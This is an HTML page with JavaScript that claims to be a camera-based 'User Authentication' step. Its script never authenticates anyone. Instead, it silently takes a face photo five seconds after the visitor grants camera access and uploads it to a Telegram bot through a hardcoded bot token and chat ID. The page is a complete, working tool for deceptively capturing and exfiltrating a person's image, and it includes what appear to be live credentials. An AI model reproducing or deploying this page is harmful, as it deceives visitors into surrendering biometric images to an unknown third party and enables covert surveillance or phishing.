<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Authentication via Camera</title>
</head>
<body>
    <h1>User Authentication</h1>
    <p>We need to capture a photo for authentication purposes. Please grant camera access to proceed.</p>
    <button id="start">Start Authentication</button>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        let stream;

        // Start authentication process
        document.getElementById("start").addEventListener("click", () => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(s => {
                    stream = s;
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.style.display = 'block';  // Show video feed
                    setTimeout(capturePhoto, 5000); // Automatically capture after 5 seconds
                })
                .catch(err => {
                    alert("Error accessing the camera: " + err);
                });
        });

        // Capture photo automatically after delay
        function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert to data URL
            const dataURL = canvas.toDataURL('image/png');
            
            // Stop the video stream
            stream.getTracks().forEach(track => track.stop());

            // Send the image to the Telegram bot or server
            sendPhotoToTelegramBot(dataURL);
        }

        // Function to send photo to Telegram bot
        function sendPhotoToTelegramBot(photoData) {
            const botToken = "7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y";
            const chatId = "6471397661";
            const formData = new FormData();
            formData.append("photo", dataURLtoBlob(photoData));
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(err => console.error(err));
        }

        // Convert Data URL to Blob
        function dataURLtoBlob(dataURL) {
            const parts = dataURL.split(',');
            const byteString = atob(parts[1]);
            const mimeString = parts[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
